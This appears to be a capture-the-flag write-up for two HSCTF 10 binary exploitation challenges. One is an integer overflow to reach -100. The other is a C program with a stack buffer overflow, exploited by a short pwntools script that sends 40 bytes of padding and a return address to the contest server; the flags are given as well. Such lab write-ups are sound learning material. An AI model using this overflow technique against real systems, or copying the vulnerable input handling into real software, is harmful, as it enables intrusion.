# Binary exploitation challenges in HSCTF 10
- [doubler](#doubler)

-----

## doubler

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/d24ea01e-8c7e-4e48-b26f-5adf045173e7)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/42f6b3af-049c-46d5-8590-281d5ccc6220)

Looks like need to do integer overflow to perfectly get -100 from a doubled number. The max positive integer is `2147483647`. So from there just work backwards to get -100.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/a8896f38-1798-452f-bc62-abc83e79398d)

Flag: `flag{double_or_nothing_406c561}`

-----

## ed

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/ddc83676-ce30-43c2-877c-7f6d16762f59)

```c
int flag() {
        puts(getenv("FLAG"));
}

int main(int argc, char** argv) {
        char input[24];
        char filename[24] = "\0";
        char buffer[64];
        FILE* f = NULL;
        setvbuf(stdout, 0, 2, 0);
        setvbuf(stdin, 0, 2, 0);
        if (argc > 1) {
                strncpy(filename, argv[1], 23);
        }
        while (1) {
                fgets(input, 64, stdin);
                input[strcspn(input, "\n")] = 0;
                if (input[0] == 'Q') {
                        return 0;
                } else if (input[0] == 'f') {
                        if (strlen(input) >= 3) {
                                strcpy(filename, input + 2);
                        }

                        if (filename[0] == '\0') {
                                puts("?");
                        } else {
                                puts(filename);
                        }
                } else if (input[0] == 'l') {
                        if (filename[0] == '\0') {
                                puts("?");
                        } else {
                                if (strchr(filename, '/') != NULL) {
                                        puts("?");
                                        continue;
                                }

                                f = fopen(filename, "r");
                                if (f == NULL) {
                                        puts("?");
                                        continue;
                                }

                                while (fgets(buffer, 64, f)) {
                                        printf("%s", buffer);
                                }
                                fclose(f);
                        }
                } else {
                        puts("?");
                }
        }
}
```

There is a bufferoverflow where we can return to the flag function:

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/f892b2d5-af5d-4925-b46a-18a3e83cc4af)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/53d932ad-d928-498a-8c8b-eae77c1ca7c7)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/482bdabb-202b-41d6-a261-8dadbb599dc1)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/4ce30208-2431-4a3f-a8ff-1222585a3e5e)

It crashed, the offset is 40. Quick script on the server gives flag.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/a6730333-7407-4abb-b27b-6dbf77e500bd)

```python
from pwn import *

r = remote("ed.hsctf.com", 1337)

flag = p64(0x00000000004011d2)

r.sendline(b"A"*40 + flag)
r.recv()
r.sendline(b"Q")
print(r.recv())
```

Flag: `flag{real_programmers_use_butterflies}`

-----
